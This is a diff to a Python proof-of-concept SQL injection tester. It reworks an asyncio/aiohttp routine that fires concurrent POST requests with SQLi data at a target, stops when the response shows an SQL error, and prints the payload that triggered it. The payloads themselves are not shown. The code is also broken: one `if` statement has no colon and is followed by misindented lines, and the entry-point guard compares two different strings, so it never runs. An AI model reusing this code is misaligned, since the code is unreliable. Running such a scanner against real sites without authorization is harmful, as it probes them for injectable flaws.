@@ -307,22 +307,18 @@ async def async_main_http():
     """
 
 # START of Asyncio POC code
+# Updated to cleaner code from this: https://stackoverflow.com/questions/54303367/python-aiohttp-cancel-async-execution-on-met-condition
 
-async def sqli_request(session, url, headers, data, proxies):
+async def sqli_request(sem, session, url, headers, data, proxies,done):
     """
     HTTP Request function to send SQLi
     """
-    async with session.post(url, headers=headers, data=data, proxy=proxies) as response:
+    async with sem, session.post(url, headers=headers, data=data, proxy=proxies) as response:
         html_body = await response.text()
-        return {"statusCode": response.status, "headers": response.headers, "body": html_body, "cookies": response.cookies}
-
-
-async def sqli_request_sem(sem, session, url, headers, data, proxies):
-    """
-    Semaphore function
-    """
-    async with sem:
-        sqli_request(session, url, headers, data, proxies)
+        if re.search("There is an SQL Error", html_body)
+              done.set()
+              done.run_answer = data
+        # return {"statusCode": response.status, "headers": response.headers, "body": html_body, "cookies": response.cookies}
 
 
 async def sqli_main():
@@ -337,27 +333,37 @@ async def sqli_main():
     url = protocol+args.host+path
 
     sem = asyncio.Semaphore(10)
+    done = asyncio.Event()
     async with ClientSession() as session:
         tasks = []
         for i in range(10):
             tasks.append(
                 asyncio.create_task(
-                    sqli_request_sem(sem, session, url, headers, data, proxies)
+                    sqli_request(sem, session, url, headers, data, proxies,done)
                 )
             )
-        responses = await asyncio.gather(*tasks)
+        await done.wait()
+    print(f"Possible SQLi using data:\n{done.run_answer}")
 
-    for r in responses:
-        print('Status_code is: ', r.get("statusCode"))
-        print('Headers are: ', r.get("headers"))
-        print('Cookies are: ', r.get("cookies"))
+    cancelled_tasks = 0
+    for t in tasks:
+        t.cancel()
+        cancelled_tasks += 1
+    print(f"Total expected requests: {len(range(10))}")
+    print(f"Total cancelled requests: {cancelled_tasks}")
+    #     responses = await asyncio.gather(*tasks)
+
+    # for r in responses:
+    #     print('Status_code is: ', r.get("statusCode"))
+    #     print('Headers are: ', r.get("headers"))
+    #     print('Cookies are: ', r.get("cookies"))
         # print('Text is: ', r.get("body"))
 
-        errors = re.search("There is an SQL Error", r.get("body"))
-        if errors:
-            print("There are errors!!! Take a closer look.")
-        else:
-            print("Nothing to see here.")
+    #     errors = re.search("There is an SQL Error", r.get("body"))
+    #     if errors:
+    #         print("There are errors!!! Take a closer look.")
+    #     else:
+    #         print("Nothing to see here.")
 
 
 if "__SQLI__name__" == "__main__":
